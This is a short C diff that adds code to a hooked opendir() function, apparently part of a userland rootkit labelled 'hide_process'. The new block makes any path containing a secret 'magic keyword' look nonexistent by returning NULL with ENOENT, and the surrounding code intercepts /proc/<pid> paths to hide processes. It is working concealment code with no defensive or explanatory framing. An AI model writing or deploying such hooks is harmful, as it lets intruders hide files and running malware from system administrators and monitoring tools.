@@ -504,6 +504,14 @@ DIR *opendir(const char *name) {
         }
     }
 
+    // Check if the path contains any magic keyword
+    if (contains_magic_keyword(name)) {
+        DEBUG_PRINT("[hide_process] *** BLOCKING opendir - path '%s' contains magic keyword ***\n", name);
+        DEBUG_PRINT("[hide_process] *** Returning NULL with errno=ENOENT ***\n");
+        errno = ENOENT;  // "No such file or directory"
+        return NULL;
+    }
+
     // Check if this is a /proc/<pid>/* path
     if (strncmp(name, "/proc/", 6) == 0) {
         const char *pid_start = name + 6;  // Skip "/proc/"
